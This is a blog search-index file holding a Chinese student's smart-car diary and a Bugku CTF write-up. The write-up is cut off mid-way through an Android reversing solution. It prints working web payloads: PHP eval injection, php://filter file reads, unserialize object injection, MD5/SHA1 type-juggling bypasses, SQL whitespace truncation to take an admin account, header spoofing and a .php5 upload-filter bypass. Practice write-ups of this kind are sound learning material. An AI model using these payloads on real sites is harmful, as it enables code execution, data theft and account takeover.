<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SmartCar-study]]></title>
    <url>%2F2019%2F10%2F25%2FSmartCar-study%2F</url>
    <content type="text"><![CDATA[这是一位不成器的计算机选手开始挑战跨专业的探测信标的智障车智能车🔞 2019/10/22练习如何焊接电路板，成就：成功焊坏一个芯片，貌似是车队最后一个 😆 2019/10/23看完IAR使用手册，熟悉IAR的实际操作😁 2019/10/24今天把kea128code中的common部分函数，梳理了一下有哪些函数以及函数的用途👀 文件名称 文件功能 assert.c 包含assert_failed函数，用于在出错的时候进行报错 assert.h 包含assert中函数说明，定义了DEBUG_PRINT common.h 这里是一个公用的头文件，集合了CPU header file，platform specific header file，toolchain specfic header filescommon utilities io.c in_char(从端口捕获输入)，out_char(将信息输出至指定端口)，char_present(貌似是返回目前端口的字符串，感觉in_char就够用了，不知道这个干嘛的） io.h 将io.c中的函数定义 memtest.c 包含memTestDataBus，memTestAddressBus，memTestDevice三个函数，分别测试数据总线，地址总线和硬件设备 memtest.h 定义memtest.c的函数以及数据格式 printf.c queue.c 由于C语言并没有队列、栈等数据结构，所以在C语言编写中需要自己写，这里自己定义了一些队列必须的函数，queue_init初始化了队列，queue_isempty判断队列是否为空，queue_add向队列中添加新元素，queue_remove删除队列中的元素，queue_peek获取队列第一个元素，queue_move整体队列迁移(这个函数倒是比较好玩，C++中queue库中貌似没有) queue.h 里面包含队列结构体的定义，头结点和尾结点，然后还有函数定义，这个队列应该是可以直接用的(目测比较完好) startup.c 里面有个pragma，是程序预处理指令，但跟我之前了解的不太一样，点这里查看详情。所以__section_begin获取这个段的首地址，__section_end获取这个段的尾地址。嗯？到现在还是没太看懂common_startup的具体实现，我的理解是他初始化程序的时候建立了一个虚拟的类似于操作系统的那部分，将ROM中存储的信息存入到RAM中，然后便于与内存建立交互。然后具体过程其实挺懵的，就是通过linker获得变长table以及变长RAM的地址，然后将table中的值赋给RAM,然后wirte_vtor(函数定义在cpu中的arm_cm0.h中)说是将指针指向一个新的复制的table，但里面的具体的程序也没看懂，接着看，获取了ROM的地址和data_ram的地址，然后将rom中的值开始赋值给data_ram了（我想问这里面还没有东西吧？？？），总之，这部分需要去问学长！！！ startup.h 就简单定义了common_startup这个函数 stdlib.h 一个C语言的库，这个不自带？？ typedef.h 自定义库，就是了一些数据结构的简写 uif.c uif.h 定义了uif.c中的函数原型，同时定义了最大指令长度为10]]></content>
      <categories>
        <category>Study</category>
      </categories>
      <tags>
        <tag>SmartCar</tag>
        <tag>IAR</tag>
        <tag>openmv</tag>
        <tag>daily_record</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-wp]]></title>
    <url>%2F2019%2F10%2F24%2FBugku-wp%2F</url>
    <content type="text"><![CDATA[bugku的部分wp MISC闪的好快 下载文件是一个动态二维码，扫描第一帧之后会返回一个S，所以猜测就是所有二维码的字符串就是flag，所以写个脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding: UTF-8 -*- import osimport requestsimport sysfrom io import BytesIOfrom pyzbar import pyzbarfrom PIL import Image,ImageEnhance def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: print "saving %s (%s) frame %d, %s %s" % (path, mode, i, im.size, im.tile) ''' If the GIF uses local colour tables, each frame will have its own palette. If not, we need to apply the global palette to the new frame. ''' if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) ''' Is this file a "partial"-mode GIF where frames update a region of a different size to the entire image? If so, we need to construct the new frame by pasting it on top of the preceding frames. ''' if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) new_frame.save('%s-%d.png' % (''.join(os.path.basename(path).split('.')[:-1]), i), 'PNG') i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass def get_ewm(): """ 读取二维码的内容： img_adds：二维码地址（可以是网址也可是本地地址 """ for i in range(0,18): img_adds = "masterGO-"+str(i)+".png" #print(img_adds) if os.path.isfile(img_adds): # 从本地加载二维码图片 img = Image.open(img_adds) else: # 从网络下载并加载二维码图片 rq_img = requests.get(img_adds).content img = Image.open(BytesIO(rq_img)) # img.show() # 显示图片，测试 txt_list = pyzbar.decode(img) for txt in txt_list: barcodeData = txt.data.decode("utf-8") sys.stdout.write(barcodeData) def main(): #先将gif分解为单帧 #processImage('masterGO.gif') get_ewm() print("\n") if __name__ == "__main__": main() 得到flag:SYC{F1aSh_so_f4sT} 啊哒 用binwalk查看文件 发现有个压缩包，binwalk分离文件，直接分离文件 得到myzip，进行解压，发现需要密码，这个时候查看一些图片的具体信息，发现 将这部分16进制转成字符串，得到sdnisc_2018 输入，得到flag.txt， 得到flag{3XiF_iNf0rM@ti0n} come_game打开文件，发现： 打开游戏运行，界面如下 发现新生成了三个文件： 用winhex打开看看，最后发现是save1文件中，存储着关卡信息，更改2对应16进制，将32改为33 发现关卡发生改变，接着改到35时，出现flag: 所以flag为FLAG{6E23F259D98DF153} 白哥的鸽子下载下来一个jpg二进制文件，猜测可能是图片，改一下文件名， 放到linux下，binwalk查看一下隐藏文件，发现没有什么特殊的地方，用winhex打开， 在末尾发现一段可用字符串，可能被加密了，用各种基本解密方法尝试解密，发现是栅栏密码， 发现flag{w22_is_v3ry_cool} linux下载下来一个压缩包文件，然后在linux中进行解压，得到一个flag的二进制文件，使用cat进行捕捉，发现flag: 隐写3下载一个压缩包，打开发现里面有张图片 放到linux中尝试看看是否有隐藏文件，发现不能打开，所以猜测是CRC校验的问题，修改高度对应位置： 得到flag{He1l0_d4_ba1} 做个游戏(08067CTF)打开文件，一个java程序，运行： 题目描述说，60秒，后面的速度越来越快，不太行~ 尝试使用逆向工具， 代码文件里面翻阅，发现 得到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} 交上去发现不对，看其中被base64加密了，解密后flag{DajiDali_JinwanChiji} WebWeb2打开链接： 查看源码，查找flag KEY{Web-2-bugKssNNikls9100} 计算器打开链接，发现只能输入一位 按f12打开控制台，查看相关源代码，发现maxlen=1，将其改为2， 重新输入，结果21即可得到flag{CTF-bugku-0032} web基础$_GET打开链接,发现以下代码： 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 很简单就是用GET方法进行传值，注意在index.php界面进行传值，payload如下： http://123.206.87.240:8002/get/index.php?what=flag 得到flag{bugku_get_su8kej2en} web基础$_POST跟上题很像，只是传参方法换了，使用POST方法，使用hackbar，直接传参： 得到flag{bugku_get_ssseint67se} 矛盾打开链接，得到这个: 1234567$num=$_GET['num'];if(!is_numeric($num)) //num不能是个数字&#123;echo $num;if($num==1) //num需要等于1echo 'flag&#123;**********&#125;';&#125; ==是比较运算符号 不会检查条件式的表达式的类型，所以我们可以构造一组整数等于1的字符串payload如下：http://123.206.87.240:8002/get/index1.php?num=1s 得到flag{bugku-789-ps-ssdf} web3打开链接： 查看源码。发现一组编码： &amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; unicode编码，解码得到KEY{J2sa42ahJK-HS11III} 域名解析 直接添加hosts文件，在尾部加上123.206.87.240 flag.baidu.com 在浏览器中输入：flag.baidu.com得到KEY{DSAHDSJ82HDS2211} 你必须让他停下打开链接，发现： 看源码，会发现图片一直在变，在这个页面一直刷新就行，就能得到flag 本地包含123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法一：eval存在命令执行漏洞，使用hello构造payloadhttp://123.206.87.240:8003/index.php?hello=1);show_source(%27flag.php%27);var_dump(3 12345678910int(1) &lt;?php $flag = 'Too Young Too Simple'; # echo $flag; # flag&#123;bug-ctf-gg-99&#125;; ?&gt; int(3) &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__); ?&gt; 方法二：http://123.206.87.240:8003/index.php?hello=1);include $_POST[&#39;f&#39;]; 在POST区域：f=php://filter/convert.base64-encode/resource=flag.php 方法三：直接将flag.php文件读入变量hello中?hello=get_file_contents(&#39;flag.php&#39;) 备份是个好习惯利用md5或者php中“==”的漏洞进行操作 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str); //用空串覆盖key所以需要构造两个重复parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 关键代码就是需要key1与key2的值相等，但是加密之前的值不同 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的 1http://123.206.87.240:8002/web16?kkeyey1[]=something&amp;kkeyey2[]=nothing 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 1234567891011121314下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387ahttp://123.206.87.240:8002/web16?kkeyey1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机2s秒内需要计算出结果然后post value值上去，可以用脚本进行计算 123456789101112import requestsimport reurl='http://123.206.87.240:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)ans = re.findall('&lt;div&gt;(.*?)=\?;&lt;/div&gt;', requestpage.text) #获取表达式#print("ans",ans)ans="".join(ans)#列表转为字符串post=eval(ans)#计算表达式的值data=&#123;'value':post&#125;#构造post的data部分flag=r.post(url,data=data)print(flag.text) 得到flag: Bugku{YOU_DID_IT_BY_SECOND} 速度要快 看看源代码，需要我们post一个margin值上去 尝试抓包，发送repeater一下，然后go，发现flag，base64解密 交上去，发现不对，然后将margin赋值，用post方法传上去，发现也不对，再go几次发现，flag值在变化..…..… 想想题目说速度要快，所以可能需要通过脚本进行传值 12345678910import requestsimport base64url="http://123.206.87.240:8002/web6/"r=requests.session()headers=r.get(url).headers #获取headermid=base64.b64decode(headers['flag'])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值data=&#123;'margin':flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗 打开看是一堆字符串，而且是一组重复出现，尝试MD5解密，没有结果。之后看看url http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= filename后的好像是base64编码，尝试解码：keys.txt 也就是说我们可以通过filename来得到文件信息,而我们想得到flag可以尝试看一下后台index.php的源码，同样需要将iindex.php编码,用line控制行数可将其打印出。 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 使用脚本 12345import requestsfor i in range(30): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s = requests.get(url) print(s.text) 得到 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 我们可以尝试添加Cookie,然后将keys.php编码后传上去 得到flag:KEY{key_keys} nerve give up 还是看看源码： 所以访问下http://123.206.87.240:8006/test/1p.html 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 得到一组base64加密字符串，注意这里%3D%3D-–%3E是url加密，解密的是==--&gt; 所以直接进行base64解密得到： 1234567891011121314151617181920212223";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) #寻找.在a中第一次出现的位置&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 尝试直接访问f4l2a3g.txt文件，得到flag:flag{tHis_iS_THe_fLaG} welcome to bugkuctf打开链接，还是啥都没有，看看源代码 12345678910111213&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; //user不为空且user=welcome to the bugkuctf echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到 “php://input”协议。大致的意思是让 txt=php://input ，之后在post过去一个字符串 http://123.206.87.240:8006/index.php?txt=php://input welcome to the bugkuctf //将其post上去 此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php（简单来说就是利用伪协议读取所包含文件的base64值） 123456789101112131415PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== 解码：&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; //如果文件为空， echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 看看能不能直接读flag: 显然没有flag,所以不能直接访问。这个信息返回到index.php页面，所以讲hint.php改成index.php看看里面的信息。 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数） 12345678910&lt;?php class Flag&#123; public $file; &#125; $a = new Flag(); $a-&gt;file = "flag.php"; $a = serialize($a); print_r($a); ?&gt; O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 所以构造的url为：http://123.206.87.240:8006/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 得到flag:flag{php_is_the_best_language} 字符？正则？ 利用正则匹配构造id的值，用GET方法传上去 12345678910111213/代表匹配的开始与结束两个/里面的内容就是要匹配的内容.代表数字匹配任意数字，*代表匹配0-n次两者结合.*就是匹配任一个数字任意次\表示要找\后面的内容，\/.\/就是找/数字/&#123;4,7&#125;表示匹配前一个字符4到7次[a-z]就是匹配a-z之间的字符[[:punct:]]代表任意标点i代表字体大小 前女友（SKCTF) 打开链接出现这个，查看源码， 点击一下，可以得到code.txt中的内容 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; //相等返回0，不相等返回非0值 echo $flag; &#125; &#125;&#125;?&gt; 跟前面一道题很像，绕过md5，这里需要说一下就是strcmp在比较数组的时候返回应该是0，所以url构造如下：http://123.206.31.85:49162/index.php?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=something 得到flag:SKCTF{Php_1s_tH3_B3St_L4NgUag3} login1(SKCTF) 随便注册一下，发现，无法登陆，发现可以注册账号，之后登陆发现需要获取管理员权限 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的 SELECT * FROM users WHERE username=&#39;vampire &#39;; 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。 注意密码是大小字母还要加数字，还有admin后的空格需要足够多的。 我的注册是： 12admin 123QW123q 之后登陆就能得到flag:SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 你从哪里来 伪造一下来源，改一下referer referer: https://www.google.com 得到flag{bug-ku_ai_admin} 目前遇到几个有关请求头的题，这里就稍微做一下总结 通用首部字段 请求首部字段 响应首部字段 md5 collision(NUPT_CTF) 根据题目所说，md5冲突，无非就是两个不同的值，但md5相等,所以先试试0e开头的 http://123.206.87.240:9009/md5.php?a=s878926199a 得到flag:flag{md5_collision_is_easy} 程序员本地网站 从本地访问，可以很清楚地看出，需要我们改一下X-Forwarded-For的值为：127.0.0.1 可以用burpsuite抓包，得到flag:flag{loc-al-h-o-st1} 各种绕过 打开链接会发现： 12345678910111213141516 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']); //url解码$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 首先id=urlencode(margin)=margin，uname不能和passwd相等，但是sha1之后要相等，sha1只对字符型进行处理，是数组的话返回false,注意是在index.php中传值。 所以payload:http://123.206.87.240:8002/web7/index.php?id=margin&amp;uname[]=something 还需要post：passwd[]=nothing 可以用hackbar完成操作，得到Flag: flag{HACK_45hhs_213sDD} web8 1234567891011121314151617&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));//trim() 函数移除字符串两侧的空白字符或其他预定义字符//file_get_contents() 函数把整个文件读入一个字符串中if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 题目中提出有txt文件，尝试1.txt,index.txt,flag.txt，最后发现flag.txt中有文件， 所以payload:http://123.206.87.240:8002/web8/index.php?ac=flags&amp;fn=flag.txt 得到flag:flag{3cfb7a90fc0de31} 细心 打开链接发现这样的页面： 我还以为这道题又被大佬们给干掉了，看了别人的博客发现可以做，那就接着走..…..… 查看源码，什么也没有。怎么办？？用御剑扫一下后台吧 发现可以访问，robots.txt，打开看看 接着做 题目是想办法变成admin，所以试试下面这个payload=http://123.206.87.240:8002/web13/resusl.php?x=admin 得到flag:flag(ctf_0098_lkji-s) 求getshell 打开链接， 大佬说的，如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag 先传一张图片，进行抓包，然后修改下面两个地方： filename 改为 1.php5 消息头中的Content-type将其后随便一个字母改为大写 Re入门逆向下载下来，查看一下文件类型： 32位应用程序，所以用ida打开： 发现一组ASCII码的数据，直接进行解码就行 flag{Re_1s_S0_C0oL} Easy_vb下载解题文件，查看一下文件类型： 用ida打开看看： 发现flag，看题目要求，flag最终为：flag{_N3t_Rev_1s_E4ay_} Easy_re下载解题文件后，先查看文件类型 运行试试： 现在用ida打开看看，容易找到相应位置 逆序，DUTCTF{We1c0met0DUTCTF}Easy_re 下载解题文件后，先查看文件类型 运行试试： 现在用ida打开看看，容易找到相应位置 逆序，DUTCTF{We1c0met0DUTCTF} 游戏过关方法一这是一道exe逆向问题，而网上大多教程都是用OD解题，此时我对OD的使用情况并不是特别的熟练，尝试用ida进行解题。 用ida打开， 尝试找到main函数，可以i搜索，在function中用CTRL+F进行搜索： 查看main函数： 读完函数逻辑，查看其中的if-else判断，经逐个测试，发现最终会进入到： 顺着思路，发现sub_45E940函数，打开查看逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121sub_45A7BE("done!!! the flag is "); v59 = 18; v60 = 64; v61 = 98; v62 = 5; v63 = 2; v64 = 4; v65 = 6; v66 = 3; v67 = 6; v68 = 48; v69 = 49; v70 = 65; v71 = 32; v72 = 12; v73 = 48; v74 = 65; v75 = 31; v76 = 78; v77 = 62; v78 = 32; v79 = 49; v80 = 32; v81 = 1; v82 = 57; v83 = 96; v84 = 3; v85 = 21; v86 = 9; v87 = 4; v88 = 62; v89 = 3; v90 = 5; v91 = 4; v92 = 1; v93 = 2; v94 = 3; v95 = 44; v96 = 65; v97 = 78; v98 = 32; v99 = 16; v100 = 97; v101 = 54; v102 = 16; v103 = 44; v104 = 52; v105 = 32; v106 = 64; v107 = 89; v108 = 45; v109 = 32; v110 = 65; v111 = 15; v112 = 34; v113 = 18; v114 = 16; v115 = 0; v2 = 123; v3 = 32; v4 = 18; v5 = 98; v6 = 119; v7 = 108; v8 = 65; v9 = 41; v10 = 124; v11 = 80; v12 = 125; v13 = 38; v14 = 124; v15 = 111; v16 = 74; v17 = 49; v18 = 83; v19 = 108; v20 = 94; v21 = 108; v22 = 84; v23 = 6; v24 = 96; v25 = 83; v26 = 44; v27 = 121; v28 = 104; v29 = 110; v30 = 32; v31 = 95; v32 = 117; v33 = 101; v34 = 99; v35 = 123; v36 = 127; v37 = 119; v38 = 96; v39 = 48; v40 = 107; v41 = 71; v42 = 92; v43 = 29; v44 = 81; v45 = 107; v46 = 90; v47 = 85; v48 = 64; v49 = 12; v50 = 43; v51 = 76; v52 = 86; v53 = 13; v54 = 114; v55 = 1; v56 = 117; v57 = 126; v58 = 0; for ( i = 0; i &lt; 56; ++i ) &#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u; &#125; return sub_45A7BE("%s\n"); 写个python脚本： 12345678910#encoing=utf-8array1 = [0x12,0x40,0x62,0x5,0x2,0x4,0x6,0x3,0x6,0x30,0x31,0x41,0x20,0x0C,0x30,0x41,0x1F,0x4E,0x3E,0x20,0x31,0x20,0x1,0x39,0x60,0x3,0x15,0x9,0x4,0x3E,0x3,0x5,0x4,0x1,0x2,0x3,0x2C,0x41,0x4E,0x20,0x10,0x61,0x36,0x10,0x2C,0x34,0x20,0x40,0x59,0x2D,0x20,0x41,0x0F,0x22,0x12,0x10,0x0] array2 = [0x7B,0x20,0x12,0x62,0x77,0x6C,0x41,0x29,0x7C,0x50,0x7D,0x26,0x7C,0x6F,0x4A,0x31,0x53,0x6C,0x5E,0x6C,0x54,0x6,0x60,0x53,0x2C,0x79,0x68,0x6E,0x20,0x5F,0x75,0x65,0x63,0x7B,0x7F,0x77,0x60,0x30,0x6B,0x47,0x5C,0x1D,0x51,0x6B,0x5A,0x55,0x40,0x0C,0x2B,0x4C,0x56,0x0D,0x72,0x1,0x75,0x7E,0x0] flag = ""for i in range(0,0x38): flag += chr(array1[i]^array2[i]^0x13)print(flag) 得到zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} 方法二查看文件， 运行看看， 用OD打开，查找关键字符串,找到相应位置： 所以我们需要跳转到这来即可，现在我们重新查找关键字符串，找到输入的地方，下一个断点： 开始动态调试： 找到一个可以跳转的函数，将此处改为我们刚刚查找的地址： jle long 0141E968 取消断点，运行一下： 得到flag:zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t} Timer一个apk文件，安装之后出现一个读秒的，用apktool进行反编译，查看 MainActivity函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package net.bluelotus.tomorrow.easyandroid;import android.os.Bundle;import android.os.Handler;import android.support.v7.app.AppCompatActivity;import android.view.Menu;import android.view.MenuItem;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; int beg = (((int) (System.currentTimeMillis() / 1000)) + 200000); int k = 0; int now; long t = 0; public native String stringFromJNI2(int i); public static boolean is2(int n) &#123; if (n &lt;= 3) &#123; if (n &gt; 1) &#123; return true; &#125; return false; &#125; else if (n % 2 == 0 || n % 3 == 0) &#123; return false; &#125; else &#123; int i = 5; while (i * i &lt;= n) &#123; if (n % i == 0 || n % (i + 2) == 0) &#123; return false; &#125; i += 6; &#125; return true; &#125; &#125; protected void onCreate(Bundle savedInstanceState) &#123; //调用父类Activity的onCreate()方法,超类继承防止递归调用 super.onCreate(savedInstanceState); //setContentView(R.layout.activity_main)这行代码，来将指定的资源xml文件加载到对应的activity setContentView((int) R.layout.activity_main); //文本框 final TextView tv1 = (TextView) findViewById(R.id.textView2); final TextView tv2 = (TextView) findViewById(R.id.textView3); //创建一个消息处理 final Handler handler = new Handler(); handler.postDelayed(new Runnable() &#123; public void run() &#123; MainActivity.this.t = System.currentTimeMillis(); MainActivity.this.now = (int) (MainActivity.this.t / 1000); MainActivity.this.t = 1500 - (MainActivity.this.t % 1000); 